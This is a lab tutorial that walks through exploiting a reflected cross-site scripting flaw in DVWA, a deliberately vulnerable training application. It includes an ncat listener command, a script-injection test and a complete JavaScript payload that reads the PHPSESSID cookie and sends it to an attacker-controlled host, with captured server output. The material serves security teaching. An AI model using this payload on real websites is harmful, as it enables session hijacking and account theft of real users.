# Tutorial 7: Client-Side Web Vulnerabilities (Part 1)

## Cross-site scripting vulnerabilities in DVWA
Our goal is to exploit the vulnerbilities in the **XSS (Reflected and Stored)** categories on `dvwa`. I will first go through the **Reflected** category, then the **Stored**. To test this vulneratility, a "fake" web server was instantiated on port 8000 using the following command:
```
ncat -lkc "perl -e 'while (defined(\$x = <>)){ print STDERR \$x; last if \$x eq qq#\\r\\n
# } print qq#HTTP/1.1 204 No Content\\r\\n#'" 8000
```

*Security Level: low*

Looking at the source code, we can see that there is no filtering of the user input:
```php
echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
```
This means that a basic XXS attack should work. If we enter `<script src=http://10.6.66.42:8000></script>` instead of a name, we can see a response appear in the terminal of our "fake"  web server:
```
GET / HTTP/1.1
Host: 10.6.66.64:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.6.66.42/
```
Now that we've established communication to our web server, the next step is figuring out how to attach the session cookie to the http request. Unfortunately this isn't possible using our previous approach. In order to exfiltrate data, we need to make an `XMLHttpRequest`, which we can then add information to:
```html
<script>
  var msg = new XMLHttpRequest();
  var url = "http://10.6.66.64:8000";
  var params = "?test=test";
  msg.open("GET", url+params, async=false);
  msg.send();
</script>
```
Sending this script leads to the same response as the previous one, but with `GET /?test=test HTTP/1.1` as part of the first line. This now gives us the tool to exfiltrate data. Note that sending this request will cause the dvwa webpage to freeze up (presumably because we send an asynchronous request). Now that we can attach data, we need to get the session cookie. Cookies can be accessed in javascript with `document.cookie`. We could just send this entire string back as part of our query string, but finding the specific cookie we are looking for is a git more elegant. We can define the following javascript funciton to do this:
```javascript
function getCookie(name) {
  const value = `; ${document.cookie}`; // Pre-pends a ; to our string so that all cookies match the same pattern "; {name}={value}"
  const parts = value.split(`; ${name}=`); // Splits the string in 2 if we find our target cookie name, with the target value in the second part of the string
  if (parts.length === 2) return parts.pop().split(';').shift(); //Take the second element of the array (contains our target value), now split on ';' and take the first element (our target value)
}
```
Combining all of this together, we can send the following payload:
```html
<script>
    var msg = new XMLHttpRequest();
    var url = "http://10.6.66.64:8000";
    function getCookie(name) {
      const value = `; ${document.cookie}`;
      const parts = value.split(`; ${name}=`);
      if (parts.length === 2) return parts.pop().split(';').shift();
    }
    msg.open("GET", url+"?PHPSESSID="+getCookie("PHPSESSID"), async=false);
    msg.send();
</script>
```
We receive this in our web server as `GET /?PHPSESSID=c0qlht8eff4bsj7iqo3a0so092 HTTP/1.1`. If a user now visits the url which sets name to this payload, their session cookie would be leaked. If we check in the browser storage, we can see that the cookie we received matches the stored value of `PHPSESSID`.
